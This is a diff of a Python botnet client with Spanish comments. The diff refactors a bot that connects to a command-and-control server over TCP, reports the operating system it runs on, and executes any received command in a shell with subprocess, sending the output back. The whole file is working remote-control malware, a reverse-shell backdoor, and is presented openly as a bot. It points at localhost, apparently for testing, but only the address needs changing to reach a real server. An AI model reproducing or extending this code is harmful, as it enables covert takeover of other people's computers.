@@ -1,69 +1,105 @@
 import socket
 import subprocess
+import platform
 
-# Dirección y puerto del servidor C&C (debe coincidir con el servidor)
-HOST = "127.0.0.1"  # IP del servidor C&C (En este caso, usamos localhost para prueba)
-PORT = 9999  # Puerto que escucha el servidor C&C
+HOST = "127.0.0.1"
+PORT = 9999
 
-# Función que usaremos para conectar el bot al servidor C&C
+def detectar_sistema():
+    
+    """
+    Detecta el sistema operativo del bot.
+
+    Usa la función platform.system() para determinar el sistema operativo
+    del bot y devuelve el resultado en minúsculas, ya sea "windows" o "linux".
+    """
+    return platform.system().lower()  # "windows" o "linux"
+
 def conectar_a_CnC():
+    
     """
-    Conecta el bot al servidor C&C.
+    Establece una conexión del bot al servidor de Comando y Control (C&C).
 
-    Crea un socket y se conecta a la dirección y puerto especificados en HOST y PORT.
-    Si la conexión es exitosa, imprime un mensaje de confirmación y devuelve el socket.
+    Crea un socket TCP/IP y se conecta al servidor C&C usando la dirección
+    y puerto especificados por las variables HOST y PORT. Devuelve el socket
+    conectado para permitir la comunicación con el servidor.
 
-    Returns:
-        socket.socket: El socket conectado al servidor C&C.
+    :return: El socket conectado al servidor C&C.
     """
-    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creamos un socket
-    bot.connect((HOST, PORT))  # Conectamos al servidor
-    print(f"Conectado al servidor C&C {HOST}:{PORT}")  # Imprimimos confirmación
-    return bot # Retornamos el socket
+
+    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    bot.connect((HOST, PORT))
+    print(f"Conectado al servidor C&C {HOST}:{PORT}")
+    return bot
 
 # Función para esperar órdenes del servidor C&C
 def esperar_ordenes(bot):
-    """
-    Espera órdenes del servidor C&C y las ejecuta.
-
-    Recibe comandos del servidor C&C a través del socket `bot` y los ejecuta en el
-    intérprete de comandos actual. Si el comando falla, envía el mensaje de error al
-    servidor C&C.
-
-    Parameters:
-        bot (socket.socket): El socket conectado al servidor C&C.
-
-    Returns:
-        None
-    """
     
+    """
+    Espera y procesa órdenes enviadas por el servidor C&C al bot.
+
+    Entra en un bucle infinito donde recibe comandos del servidor C&C 
+    a través del socket proporcionado. Si el comando recibido es "detect_os", 
+    responde con el sistema operativo del bot. Para otros comandos, los ejecuta 
+    utilizando la función ejecutar_comando y envía el resultado de vuelta al 
+    servidor. Si ocurre un error durante la recepción o ejecución de un comando, 
+    se imprime el error y se rompe el bucle.
+
+    :param bot: El socket conectado al servidor C&C.
+    """
+
     while True:
-        # Recibir comandos del servidor C&C
-        orden = bot.recv(1024).decode('utf-8', errors='ignore')  # Aumentar el tamaño del buffer para recibir más datos
-        if orden: # Si el comando no es vacío
-            print(f"Comando recibido: {orden}")  # Imprimir el comando
-            # Ejecutar el comando recibido y capturar la salida
-            try:
-                resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT) # Guarda en el resultado el resultado de la ejecución
-                bot.send(resultado)  # Enviar el resultado al servidor
-            except subprocess.CalledProcessError as e:
-                bot.send(f"Error al ejecutar el comando: {e.output.decode('utf-8', errors='ignore')}".encode('utf-8'))  # Enviar el error al servidor
+        try:
+            orden = bot.recv(1024).decode('utf-8', errors='ignore').strip() # Recibir el comando
+            if not orden:
+                continue  # Si la orden está vacía, seguir esperando
+            
+            print(f"Comando recibido: {orden}")
 
-# Función principal que conecta el bot al servidor C&C y espera órdenes
+            if orden == "detect_os": # Si el comando es "detect_os"
+                bot.send(detectar_sistema().encode("utf-8")) # Enviar el sistema operativo del bot
+                continue
+            resultado = ejecutar_comando(orden) # Ejecutar el comando
+            bot.send(resultado if resultado else b"Comando ejecutado sin salida") # Enviar el resultado
+
+        except Exception as e:
+            print(f"Error: {e}")
+            break
+
+def ejecutar_comando(orden):
+    
+    """
+    Ejecuta un comando del sistema operativo recibido como cadena.
+
+    Usa subprocess para ejecutar el comando proporcionado y captura su salida.
+    Si el comando se ejecuta correctamente, devuelve la salida. Si ocurre un 
+    error durante la ejecución, captura la salida de error y la devuelve 
+    como mensaje de error.
+
+    :param orden: Comando del sistema a ejecutar.
+    :return: Salida del comando o mensaje de error en caso de fallo.
+    """
+
+    try:
+        resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT) # Ejecutar el comando
+        return resultado
+    except subprocess.CalledProcessError as e:
+        return f"Error al ejecutar el comando: {e.output.decode('utf-8', errors='ignore')}".encode('utf-8') # Devolver el error
+
 def ejecutar_bot():
+    
     """
-    Conecta el bot al servidor C&C y espera órdenes.
+    Función principal que conecta el bot al servidor C&C y espera órdenes.
 
-    Primero, se conecta al servidor C&C usando la función `conectar_a_CnC`.
-    Luego, entra en un bucle infinito en el que espera comandos del servidor C&C
-    a través del socket `bot` y los ejecuta en el intérprete de comandos actual
-    con la función `esperar_ordenes`.
+    Establece la conexión con el servidor de Comando y Control (C&C) usando
+    la función conectar_a_CnC y luego entra en un bucle para recibir y
+    procesar órdenes mediante la función esperar_ordenes.
 
-    Returns:
-        None
+    :return: None
     """
-    bot = conectar_a_CnC()  # Conectamos al servidor
-    esperar_ordenes(bot)  # Esperamos órdenes
+
+    bot = conectar_a_CnC() # Conectar al servidor C&C
+    esperar_ordenes(bot) # Esperar y procesar órdenes
 
 if __name__ == "__main__":
-    ejecutar_bot()  # Ejecutamos el bot
+    ejecutar_bot() # Ejecutar el bot
